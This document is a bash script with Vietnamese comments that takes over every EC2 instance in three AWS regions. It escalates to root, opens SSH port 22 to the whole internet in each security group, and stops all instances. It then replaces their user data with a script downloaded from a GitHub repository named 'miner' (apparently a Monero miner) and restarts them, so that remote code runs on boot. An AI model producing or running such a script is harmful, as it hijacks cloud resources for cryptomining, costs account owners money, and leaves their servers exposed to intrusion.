#!/bin/bash

# Kiểm tra nếu không chạy với quyền root thì tự động chuyển sang root
if [[ $EUID -ne 0 ]]; then
    echo "⚠️ Script chưa chạy với quyền root. Chuyển sang root..."
    exec sudo bash "$0" "$@"
fi

# URL chứa User Data trên GitHub
USER_DATA_URL="https://raw.githubusercontent.com/hieudv194/miner/refs/heads/main/vixmrlm-64"

# File tạm để lưu User Data
USER_DATA_FILE="/tmp/user_data.sh"

# Danh sách vùng AWS cần thay đổi instance
REGIONS=("us-east-1" "us-west-2" "us-east-2")

# Tên Key Pair
KEY_NAME="MyKey"
KEY_FILE="${KEY_NAME}.pem"

# Tạo Key Pair nếu chưa có
if [ ! -f "$KEY_FILE" ]; then
    echo "🔑 Tạo Key Pair AWS: $KEY_NAME..."
    aws ec2 create-key-pair --key-name "$KEY_NAME" --query 'KeyMaterial' --output text > "$KEY_FILE"
    chmod 600 "$KEY_FILE"
    echo "✅ Key Pair $KEY_NAME đã được tạo và lưu tại $KEY_FILE."
else
    echo "✅ Key Pair $KEY_NAME đã tồn tại."
fi

# Hàm kiểm tra và mở cổng SSH (22) nếu bị chặn
ensure_ssh_open() {
    local sg_id="$1"
    local region="$2"

    if ! aws ec2 describe-security-group-rules --region "$region" \
        --filters Name=group-id,Values="$sg_id" Name=ip-permission.from-port,Values=22 \
                  Name=ip-permission.to-port,Values=22 Name=ip-permission.cidr,Values=0.0.0.0/0 > /dev/null 2>&1; then
        echo "🔓 Mở cổng SSH (22) trong Security Group $sg_id..."
        aws ec2 authorize-security-group-ingress --group-id "$sg_id" --protocol tcp \
            --port 22 --cidr 0.0.0.0/0 --region "$region"
    else
        echo "✅ Cổng SSH (22) đã được mở."
    fi
}

# Tải User Data từ GitHub và mã hóa thành Base64
download_and_encode_user_data() {
    echo "📥 Đang tải User Data từ GitHub..."
    curl -s -L "$USER_DATA_URL" -o "$USER_DATA_FILE"

    # Kiểm tra nếu file tồn tại và không rỗng
    if [ ! -s "$USER_DATA_FILE" ]; then
        echo "❌ Lỗi: Không tải được User Data từ GitHub."
        exit 1
    fi

    # Kiểm tra User Data có chạy được không
    if ! bash -n "$USER_DATA_FILE"; then
        echo "❌ Lỗi: User Data không hợp lệ khi chạy với bash."
        exit 1
    fi

    echo "✅ User Data hợp lệ."
    base64 -w 0 "$USER_DATA_FILE"
}

# Lặp qua từng vùng để kiểm tra và xử lý
for REGION in "${REGIONS[@]}"; do
    echo "🔹 Đang xử lý vùng: $REGION"

    # Lấy danh sách Instance ID và Security Group ID trong vùng
    INSTANCE_INFO=$(aws ec2 describe-instances --region "$REGION" \
        --query "Reservations[*].Instances[*].[InstanceId,SecurityGroups[0].GroupId]" --output text)

    if [ -z "$INSTANCE_INFO" ]; then
        echo "⚠️ Không có instance nào trong vùng $REGION."
        continue
    fi

    INSTANCE_IDS=($(echo "$INSTANCE_INFO" | awk '{print $1}'))
    SECURITY_GROUP_IDS=($(echo "$INSTANCE_INFO" | awk '{print $2}'))

    # Đảm bảo mở cổng SSH cho từng Security Group
    for SG_ID in "${SECURITY_GROUP_IDS[@]}"; do
        ensure_ssh_open "$SG_ID" "$REGION"
    done

    # Dừng tất cả instances
    echo "🛑 Dừng tất cả instances trong vùng $REGION..."
    aws ec2 stop-instances --instance-ids "${INSTANCE_IDS[@]}" --region "$REGION"
    aws ec2 wait instance-stopped --instance-ids "${INSTANCE_IDS[@]}" --region "$REGION"

    # Tải và mã hóa User Data
    USER_DATA_BASE64=$(download_and_encode_user_data)

    # Cập nhật User Data
    for INSTANCE in "${INSTANCE_IDS[@]}"; do
        echo "📝 Cập nhật User Data cho instance $INSTANCE..."
        aws ec2 modify-instance-attribute --instance-id "$INSTANCE" \
            --user-data "Value=$USER_DATA_BASE64" --region "$REGION"
    done

    # Khởi động lại instances
    echo "🚀 Khởi động lại tất cả instances trong vùng $REGION..."
    aws ec2 start-instances --instance-ids "${INSTANCE_IDS[@]}" --region "$REGION"
done

echo "✅ Hoàn tất cập nhật User Data và kiểm tra SSH!"
